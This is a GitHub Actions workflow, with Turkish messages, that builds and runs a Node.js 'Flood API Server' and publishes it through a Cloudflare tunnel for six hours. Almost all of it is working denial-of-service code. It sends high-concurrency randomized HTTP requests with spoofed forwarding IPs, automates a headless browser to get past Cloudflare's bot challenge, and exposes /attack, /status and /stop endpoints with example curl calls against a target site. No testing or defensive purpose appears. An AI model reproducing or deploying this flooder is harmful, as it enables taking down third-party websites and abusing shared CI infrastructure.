name: Flood API Server

on:
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  setup-and-run:
    runs-on: windows-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    
    - name: Install Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '20'
    
    - name: Install Dependencies
      run: |
        mkdir C:\flood-api
        cd C:\flood-api
        npm init -y
        npm install express puppeteer-extra puppeteer-extra-plugin-stealth cors
    
    - name: Create Server File
      shell: powershell
      run: |
        $serverCode = @'
        const express = require('express');
        const http = require('http');
        const https = require('https');
        const os = require('os');
        const crypto = require('crypto');
        const urlModule = require('url');
        const puppeteer = require('puppeteer-extra');
        const StealthPlugin = require('puppeteer-extra-plugin-stealth');
        const cors = require('cors');

        puppeteer.use(StealthPlugin());

        process.setMaxListeners(0);
        process.env.UV_THREADPOOL_SIZE = 128;

        const app = express();
        app.use(cors());
        app.use(express.json());

        let attackStatus = {
            running: false,
            target: null,
            workers: 0,
            totalRequests: 0,
            startTime: null,
            rps: 0,
            success: 0,
            fail: 0
        };

        let cfClearance = null;
        let browser = null;

        async function getCloudflareBypass(url) {
            try {
                if (browser) {
                    try { await browser.close(); } catch(e) {}
                }
                
                browser = await puppeteer.launch({
                    headless: 'new',
                    args: [
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-blink-features=AutomationControlled',
                        '--disable-dev-shm-usage',
                        '--disable-web-security',
                        '--disable-gpu',
                        '--disable-accelerated-2d-canvas',
                        '--disable-background-timer-throttling',
                        '--disable-backgrounding-occluded-windows',
                        '--disable-breakpad',
                        '--disable-component-extensions-with-background-pages',
                        '--disable-default-apps',
                        '--disable-extensions',
                        '--disable-hang-monitor',
                        '--disable-ipc-flooding-protection',
                        '--disable-notifications',
                        '--disable-popup-blocking',
                        '--disable-renderer-backgrounding',
                        '--disable-speech-api',
                        '--disable-sync',
                        '--disable-web-resources',
                        '--enable-automation=false',
                        '--mute-audio',
                        '--no-default-browser-check',
                        '--no-first-run',
                        '--no-sandbox',
                        '--single-process',
                        '--window-size=1920,1080'
                    ],
                    defaultViewport: { width: 1920, height: 1080 }
                });
                
                const page = await browser.newPage();
                await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36');
                
                await page.goto(url, {
                    waitUntil: 'networkidle2',
                    timeout: 30000
                });
                
                const pageContent = await page.content();
                const isChallenge = pageContent.includes('cf-challenge') || 
                                   pageContent.includes('cloudflare') && 
                                   (pageContent.includes('challenge') || pageContent.includes('security'));
                
                if (isChallenge) {
                    await page.waitForFunction(
                        () => {
                            const body = document.body.innerText;
                            return !body.includes('cf-challenge') && 
                                   !body.includes('Checking your browser') &&
                                   !body.includes('Please wait') &&
                                   !body.includes('Just a moment');
                        },
                        { timeout: 60000, polling: 1000 }
                    );
                }
                
                const cookies = await page.cookies();
                for (const cookie of cookies) {
                    if (cookie.name === 'cf_clearance') {
                        cfClearance = cookie.value;
                        break;
                    }
                }
                
                await page.close();
                return true;
                
            } catch (error) {
                console.error('CF Bypass Error:', error.message);
                return false;
            }
        }

        function createWorker(targetUrl, powerLevel) {
            const parsedUrl = urlModule.parse(targetUrl);
            const isHttps = targetUrl.startsWith('https');
            const hostname = parsedUrl.hostname;
            const port = parsedUrl.port || (isHttps ? 443 : 80);
            const basePath = parsedUrl.path || '/';
            
            let successCount = 0;
            let failCount = 0;
            
            const userAgents = [];
            for (let i = 0; i < 30; i++) {
                userAgents.push(
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/' + (Math.floor(Math.random() * 21 + 100)) + '.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:' + (Math.floor(Math.random() * 22 + 100)) + '.0) Gecko/20100101 Firefox/' + (Math.floor(Math.random() * 22 + 100)) + '.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_' + (Math.floor(Math.random() * 5)) + ') AppleWebKit/605.1.15 Version/17.' + (Math.floor(Math.random() * 5)) + ' Safari/605.1.15'
                );
            }
            
            const referers = [
                'https://www.google.com/',
                'https://www.bing.com/',
                'https://www.yandex.com/',
                'https://duckduckgo.com/',
                'https://twitter.com/',
                'https://www.facebook.com/'
            ];
            
            function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
            function randomString(len) { return crypto.randomBytes(len).toString('hex'); }
            function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
            
            function generatePath() {
                let path = basePath;
                if (!path.endsWith('/')) path += '/';
                path += '?' + randomString(8) + '=' + Date.now() + '&r=' + randomString(6);
                return path;
            }
            
            function createHeaders() {
                const headers = {
                    'Host': hostname,
                    'User-Agent': randomElement(userAgents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': randomElement(referers),
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'X-Forwarded-For': randomInt(1,255) + '.' + randomInt(0,255) + '.' + randomInt(0,255) + '.' + randomInt(1,254),
                    'X-Real-IP': randomInt(1,255) + '.' + randomInt(0,255) + '.' + randomInt(0,255) + '.' + randomInt(1,254),
                    'Connection': 'keep-alive'
                };
                
                if (cfClearance) {
                    headers['Cookie'] = 'cf_clearance=' + cfClearance;
                }
                
                return headers;
            }
            
            function sendRequest() {
                const options = {
                    hostname: hostname,
                    port: port,
                    path: generatePath(),
                    method: Math.random() > 0.5 ? 'GET' : 'POST',
                    headers: createHeaders(),
                    timeout: 2000,
                    family: 4
                };
                
                const httpModule = isHttps ? https : http;
                const req = httpModule.request(options, (res) => {
                    res.resume();
                    if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 503) {
                        successCount++;
                    } else {
                        failCount++;
                    }
                });
                
                req.setNoDelay(true);
                req.on('error', () => failCount++);
                req.on('timeout', () => { req.destroy(); failCount++; });
                req.end();
            }
            
            let activeRequests = 0;
            const MAX_CONCURRENT = powerLevel;
            
            function flood() {
                const batchSize = Math.min(50, MAX_CONCURRENT);
                for (let i = 0; i < batchSize; i++) {
                    if (activeRequests < MAX_CONCURRENT) {
                        activeRequests++;
                        sendRequest();
                        setTimeout(() => activeRequests--, 10);
                    }
                }
                setImmediate(flood);
            }
            
            flood();
            
            let lastSuccess = 0;
            let lastFail = 0;
            
            setInterval(() => {
                const newSuccess = successCount - lastSuccess;
                const newFail = failCount - lastFail;
                if (newSuccess > 0 || newFail > 0) {
                    attackStatus.success += newSuccess;
                    attackStatus.fail += newFail;
                    attackStatus.totalRequests += newSuccess + newFail;
                    attackStatus.rps = newSuccess + newFail;
                    lastSuccess = successCount;
                    lastFail = failCount;
                }
            }, 1000);
        }

        app.get('/attack', async (req, res) => {
            const url = req.query.url;
            const concurrent = parseInt(req.query.concurrent) || 200;
            const threads = parseInt(req.query.threads) || 2;

            if (!url) {
                return res.status(400).json({ 
                    error: 'URL gerekli! Ornek: /attack?url=https://example.com&concurrent=200' 
                });
            }

            if (attackStatus.running) {
                return res.status(400).json({ 
                    error: 'Zaten aktif saldiri var! /stop ile durdur' 
                });
            }

            console.log('Attack started on ' + url + ' with ' + concurrent + ' concurrent, ' + threads + ' threads');
            
            attackStatus = {
                running: true,
                target: url,
                workers: threads,
                totalRequests: 0,
                startTime: Date.now(),
                rps: 0,
                success: 0,
                fail: 0
            };

            await getCloudflareBypass(url);
            
            setInterval(async () => {
                await getCloudflareBypass(url);
            }, 30000);

            for (let i = 0; i < threads; i++) {
                setTimeout(() => {
                    createWorker(url, concurrent);
                }, i * 100);
            }

            res.json({
                status: 'Attack started',
                target: url,
                threads: threads,
                concurrent: concurrent,
                message: 'GET /status ile durumu kontrol edin'
            });
        });

        app.get('/status', (req, res) => {
            const uptime = attackStatus.startTime ? 
                Math.floor((Date.now() - attackStatus.startTime) / 1000) : 0;
            
            res.json({
                running: attackStatus.running,
                target: attackStatus.target,
                workers: attackStatus.workers,
                totalRequests: attackStatus.totalRequests,
                success: attackStatus.success,
                fail: attackStatus.fail,
                rps: attackStatus.rps,
                uptime: uptime + 's',
                cfBypassed: cfClearance ? true : false
            });
        });

        app.get('/stop', (req, res) => {
            attackStatus.running = false;
            attackStatus = {
                running: false,
                target: null,
                workers: 0,
                totalRequests: 0,
                startTime: null,
                rps: 0,
                success: 0,
                fail: 0
            };
            cfClearance = null;
            
            console.log('Attack stopped');
            res.json({
                status: 'Attack stopped',
                message: 'Tum islemler durduruldu'
            });
        });

        app.get('/', (req, res) => {
            res.json({
                name: 'Flood API Server',
                version: '1.0.0',
                endpoints: {
                    attack: '/attack?url=https://example.com&concurrent=200',
                    stop: '/stop',
                    status: '/status'
                },
                docs: 'GET request ile kullanin'
            });
        });

        const PORT = 3000;
        app.listen(PORT, '0.0.0.0', () => {
            console.log('Flood API Server running on port ' + PORT);
        });

        module.exports = app;
        '@
        
        $serverCode | Out-File -FilePath "C:\flood-api\server.js" -Encoding UTF8

    - name: Start Server
      run: |
        cd C:\flood-api
        Start-Process -FilePath "node" -ArgumentList "server.js" -WindowStyle Hidden
        Start-Sleep -Seconds 5
        echo "Server started on port 3000"

    - name: Download Cloudflared
      run: |
        Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"

    - name: Start Cloudflared and Get URL
      shell: powershell
      run: |
        # Cloudflared'ı arka planda başlat
        $pinfo = New-Object System.Diagnostics.ProcessStartInfo
        $pinfo.FileName = ".\cloudflared.exe"
        $pinfo.Arguments = "tunnel --url http://localhost:3000"
        $pinfo.RedirectStandardOutput = $true
        $pinfo.RedirectStandardError = $true
        $pinfo.UseShellExecute = $false
        $pinfo.CreateNoWindow = $true
        $p = New-Object System.Diagnostics.Process
        $p.StartInfo = $pinfo
        $p.Start() | Out-Null
        
        # URL'yi bulana kadar bekle
        $tunnelUrl = $null
        $timeout = 30
        $timer = 0
        
        while ($timer -lt $timeout -and $tunnelUrl -eq $null) {
            Start-Sleep -Seconds 2
            $timer += 2
            
            # Cloudflared çıktısını oku
            $output = $p.StandardOutput.ReadToEnd()
            $errorOutput = $p.StandardError.ReadToEnd()
            $allOutput = $output + $errorOutput
            
            # URL'yi ara
            $matches = [regex]::Matches($allOutput, 'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
            if ($matches.Count -gt 0) {
                $tunnelUrl = $matches[0].Value
            }
            
            Write-Host "Bekleniyor... ($timer saniye)" -NoNewline
            Write-Host "`r" -NoNewline
        }
        
        Clear-Host
        Write-Host "============================================" -ForegroundColor Green
        Write-Host "     FLOOD API SERVER HAZIR!" -ForegroundColor Cyan
        Write-Host "============================================" -ForegroundColor Green
        Write-Host ""
        
        if ($tunnelUrl) {
            Write-Host "PUBLIC URL: $tunnelUrl" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "API ENDPOINTS:" -ForegroundColor Magenta
            Write-Host "   ${tunnelUrl}/attack?url=https://example.com&concurrent=200" -ForegroundColor White
            Write-Host "   ${tunnelUrl}/stop" -ForegroundColor White
            Write-Host "   ${tunnelUrl}/status" -ForegroundColor White
            Write-Host ""
            Write-Host "Ornek Kullanim:" -ForegroundColor Green
            Write-Host "   curl ${tunnelUrl}/attack?url=https://hedefsite.com&concurrent=300" -ForegroundColor Gray
            Write-Host "   curl ${tunnelUrl}/status" -ForegroundColor Gray
            Write-Host "   curl ${tunnelUrl}/stop" -ForegroundColor Gray
        } else {
            Write-Host "Cloudflare URL bulunamadi!" -ForegroundColor Red
            Write-Host ""
            Write-Host "Manuel olarak cloudflared loglarini kontrol edin:" -ForegroundColor Yellow
            Write-Host "   Get-Content .\cloudflared.log" -ForegroundColor Gray
        }
        Write-Host ""
        Write-Host "============================================" -ForegroundColor Green
        Write-Host "Server 6 saat boyunca aktif kalacak" -ForegroundColor Yellow
        Write-Host "============================================" -ForegroundColor Green

    - name: Keep Alive
      run: |
        Write-Host "`nServer 6 saat boyunca calisacak..." -ForegroundColor Green
        $timeout = 21600
        $elapsed = 0
        while ($elapsed -lt $timeout) {
            try {
                $response = Invoke-RestMethod -Uri "http://localhost:3000/status" -ErrorAction Stop
                $running = if ($response.running) { "Aktif" } else { "Beklemede" }
                Write-Host "[$([DateTime]::Now.ToString('HH:mm:ss'))] Status: $running | RPS: $($response.rps) | Total: $($response.totalRequests)" -ForegroundColor Green
            } catch {
                Write-Host "[$([DateTime]::Now.ToString('HH:mm:ss'))] Status check failed" -ForegroundColor Yellow
            }
            Start-Sleep -Seconds 15
            $elapsed += 15
        }
